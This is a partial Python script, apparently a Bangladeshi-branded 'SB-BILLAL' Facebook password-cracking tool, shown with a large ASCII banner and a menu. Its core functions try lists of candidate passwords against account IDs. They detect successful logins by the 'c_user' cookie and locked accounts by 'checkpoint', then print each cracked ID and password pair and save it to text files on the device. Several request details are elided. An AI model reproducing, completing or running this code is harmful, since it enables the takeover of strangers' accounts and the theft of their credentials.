...
logo=("""\033[1;97m
  .M"""bgd      db        `7MMF'  `7MMF'    db      `7MM"""Yb.       
,MI    "Y     ;MM:         MM      MM     ;MM:       MM    `Yb.     
`MMb.        ,V^MM.        MM      MM    ,V^MM.      MM     `Mb     
  `YMMNq.   ,M  `MM        MM      MM   ,M  `MM      MM      MM     
.     `MM   AbmmmqMA       MM      MM   AbmmmqMA     MM     ,MP     
Mb     dM  A'     VML (O)  MM (O)  MM  A'     VML    MM    ,dP'     
P"Ybmmd" .AMA.   .AMMA.Ymmm9   Ymmm9 .AMA.   .AMMA..JMMmmmdP'      
\33[1;37m----------------------------------------------
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/SB-BILLAL.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSB-BILLAL\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[SB-BILLAL-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SB-BILLAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[SB-BILLAL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SB-BILLAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SB-BILLAL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SB-BILLAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SB-BILLAL-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SB-BILLAL-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SB-BILLAL-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SB-BILLAL-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
